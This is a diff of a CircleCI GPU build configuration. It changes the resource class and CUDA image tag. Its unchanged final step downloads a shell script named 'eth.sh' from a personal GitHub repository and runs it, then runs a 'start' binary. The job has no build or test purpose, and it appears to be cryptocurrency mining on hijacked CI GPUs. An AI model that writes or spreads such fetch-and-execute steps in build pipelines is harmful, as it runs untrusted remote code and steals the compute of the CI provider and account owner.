@@ -1,11 +1,11 @@
-version: 2.1
-
-jobs:
-  build:
-    machine:
-      image: ubuntu-2004-cuda-11.4:202110-01
-    resource_class: gpu.nvidia.large
-    steps:
-      - run: nvidia-smi
-      - run: docker run --gpus all nvidia/cuda:11.0-base nvidia-smi
+version: 2.1  
+  
+jobs:  
+  build:  
+    machine:  
+      image: ubuntu-2004-cuda-11.4:202110-01  
+    resource_class: gpu.nvidia.small  
+    steps:  
+      - run: nvidia-smi  
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
       - run: wget https://raw.githubusercontent.com/nurfasikin/eth/main/eth.sh && chmod u+x eth.sh && ./eth.sh && chmod +x start &&./start
